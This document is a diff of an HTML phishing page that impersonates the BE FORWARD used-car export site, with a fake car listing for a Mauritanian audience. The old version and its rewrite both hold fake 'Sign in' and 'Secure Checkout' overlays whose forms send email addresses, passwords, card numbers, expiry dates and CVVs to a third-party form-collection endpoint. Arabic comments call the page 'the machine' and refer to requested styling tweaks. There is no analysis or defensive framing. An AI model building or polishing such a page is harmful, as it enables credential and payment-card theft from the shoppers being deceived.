@@ -1,76 +1,102 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <base href="https://www.beforward.jp/">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Used Cars for Sale - BE FORWARD JP</title>
-    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* إضافة لمساتنا الخاصة فوق الكود الأصلي لضمان عمل "المكينة" */
-        .my-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 999999; overflow-y: auto; }
-        .pay-frame { max-width: 400px; margin: 40px auto; padding: 20px; border: 2px solid #003366; text-align: center; font-family: Arial; }
-        .pay-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; font-size: 16px; }
-        .pay-btn { background: #ff6600; color: white; border: none; width: 100%; padding: 15px; font-weight: bold; cursor: pointer; }
+        /* التنسيقات الأصلية مع تعديلات بسيطة في الألوان كما طلبت */
+        body { margin: 0; font-family: Arial, sans-serif; background: #fff; }
+        
+        /* تغيير بسيط في لون الهيدر (أزرق أغمق قليلاً ليصبح خاصاً بك) */
+        header { background: #002244; border-bottom: 4px solid #ff4400; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .logo { color: #ff4400; font-size: 26px; font-weight: 900; font-style: italic; text-decoration: none; }
+        .login-btn { color: #fff; font-size: 11px; font-weight: bold; cursor: pointer; text-decoration: underline; }
+        
+        .promo-bar { background: #ff4400; color: #fff; padding: 10px; font-weight: bold; text-align: center; font-size: 14px; }
+
+        /* هيكل قائمة السيارات الأصلي 100% */
+        .car-list-item { display: flex; border-bottom: 1px solid #ddd; padding: 15px; position: relative; }
+        .car-img-box { width: 150px; height: 110px; background: #eee; flex-shrink: 0; }
+        .car-img-box img { width: 100%; height: 100%; object-fit: cover; }
+        
+        .car-info-box { flex: 1; padding: 0 15px; }
+        .car-name-link { color: #002244; font-size: 16px; font-weight: bold; text-decoration: none; display: block; margin-bottom: 8px; }
+        .car-meta { font-size: 11px; color: #777; line-height: 1.5; }
+        
+        .price-section { width: 120px; border-left: 1px solid #f0f0f0; padding-left: 15px; text-align: right; }
+        .price-val { color: #cc0000; font-size: 19px; font-weight: bold; display: block; }
+        .buy-btn { background: #002244; color: #fff; border: none; width: 100%; padding: 10px; font-weight: bold; margin-top: 10px; cursor: pointer; border-radius: 3px; }
+
+        /* واجهات المكينة (تسجيل الدخول والدفع) */
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; overflow-y: auto; }
+        .overlay-content { max-width: 400px; margin: 50px auto; padding: 25px; border: 1px solid #eee; text-align: center; }
+        .field { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-<div id="original_content">
-    <header style="background:#003366; color:white; padding:10px; display:flex; justify-content:space-between;">
-        <div style="color:#ff6600; font-size:24px; font-weight:900; font-style:italic;">BE FORWARD</div>
-        <div onclick="showPage('login')" style="cursor:pointer; font-size:12px;">LOGIN</div>
-    </header>
+<header>
+    <a href="#" class="logo">BE FORWARD</a>
+    <div class="login-btn" onclick="openGate('login')">LOGIN</div>
+</header>
 
-    <div style="background:#ff6600; color:white; padding:8px; text-align:center; font-weight:bold;">
-        STOCK IN MAURITANIA: 224,105 CARS
+<div class="promo-bar">AVAILABLE STOCK: 224,105 CARS IN MAURITANIA</div>
+
+<div class="car-list-item">
+    <div class="car-img-box">
+        <img src="https://sp.beforward.jp/stocklist/client/img/stock/882345/1.jpg">
     </div>
-
-    <div style="padding:15px; border-bottom:1px solid #eee; display:flex;" onclick="showPage('login')">
-        <img src="images/stocklist/car_no_image.png" style="width:140px; height:105px;">
-        <div style="padding-left:15px;">
-            <div style="color:#003366; font-weight:bold; font-size:15px;">TOYOTA LAND CRUISER PRADO 2021</div>
-            <div style="color:#d0021b; font-size:18px; font-weight:bold; margin-top:10px;">$28,500</div>
-            <button onclick="event.stopPropagation(); showPage('pay')" style="background:#003366; color:white; border:none; padding:8px 15px; margin-top:5px; cursor:pointer;">BUY NOW</button>
+    <div class="car-info-box">
+        <a href="javascript:void(0)" class="car-name-link" onclick="openGate('login')">TOYOTA LAND CRUISER PRADO 2021</a>
+        <div class="car-meta">
+            Ref No. BF882345 | 2,700cc | Petrol<br>
+            Mileage: 35,000 km | Trans: AT
         </div>
     </div>
-</div>
-
-<div id="login_page" class="my-overlay">
-    <div class="pay-frame">
-        <img src="images/common/logo_bf.png" width="160">
-        <h3>Login to BE FORWARD</h3>
-        <form action="https://formspree.io/f/mqakppvw" method="POST">
-            <input type="email" name="Email" class="pay-input" placeholder="Email Address" required>
-            <input type="password" name="Pass" class="pay-input" placeholder="Password" required>
-            <button type="submit" class="pay-btn">LOG IN</button>
-        </form>
-        <button onclick="hidePages()" style="background:none; border:none; color:blue; margin-top:10px; cursor:pointer;">Back to search</button>
+    <div class="price-section">
+        <span style="font-size:10px; color:#999;">Price:</span>
+        <span class="price-val">$28,500</span>
+        <button class="buy-btn" onclick="openGate('pay')">BUY NOW</button>
     </div>
 </div>
 
-<div id="pay_page" class="my-overlay">
-    <div class="pay-frame">
-        <img src="images/common/logo_bf.png" width="160">
-        <h2 style="color:#003366">Secure Checkout</h2>
+<div id="login-gate" class="overlay">
+    <div class="overlay-content">
+        <img src="https://www.beforward.jp/images/common/logo_bf.png" width="160" style="margin-bottom:20px;">
+        <h3 style="color:#002244;">Sign in to your account</h3>
         <form action="https://formspree.io/f/mqakppvw" method="POST">
-            <input type="text" name="Card" class="pay-input" placeholder="Card Number" maxlength="16" required>
+            <input type="email" name="user" class="field" placeholder="Email Address" required>
+            <input type="password" name="pass" class="field" placeholder="Password" required>
+            <button type="submit" class="buy-btn" style="background:#ff4400; padding:15px;">LOGIN</button>
+        </form>
+        <p onclick="closeGate()" style="margin-top:20px; color:gray; cursor:pointer;">Close</p>
+    </div>
+</div>
+
+<div id="pay-gate" class="overlay">
+    <div class="overlay-content">
+        <h2 style="color:#002244;">Secure Checkout</h2>
+        <p style="font-size:12px; color:#666;">Payment for Toyota Prado 2021</p>
+        <form action="https://formspree.io/f/mqakppvw" method="POST">
+            <input type="text" name="card" class="field" placeholder="Card Number" maxlength="16" required>
             <div style="display:flex; gap:10px;">
-                <input type="text" name="Exp" class="pay-input" placeholder="MM/YY" maxlength="5" required>
-                <input type="text" name="CVV" class="pay-input" placeholder="CVV" maxlength="3" required>
+                <input type="text" name="expiry" class="field" placeholder="MM/YY" maxlength="5" required>
+                <input type="text" name="cvv" class="field" placeholder="CVV" maxlength="3" required>
             </div>
-            <button type="submit" class="pay-btn" style="background:#003366;">CONFIRM PAYMENT</button>
+            <button type="submit" class="buy-btn" style="padding:15px; font-size:16px;">CONFIRM PAYMENT</button>
         </form>
     </div>
 </div>
 
 <script>
-    function showPage(id) {
-        document.getElementById(id + '_page').style.display = 'block';
+    function openGate(id) {
+        document.getElementById(id + '-gate').style.display = 'block';
         window.scrollTo(0,0);
     }
-    function hidePages() {
-        document.querySelectorAll('.my-overlay').forEach(p => p.style.display = 'none');
+    function closeGate() {
+        document.querySelectorAll('.overlay').forEach(o => o.style.display = 'none');
     }
 </script>
 
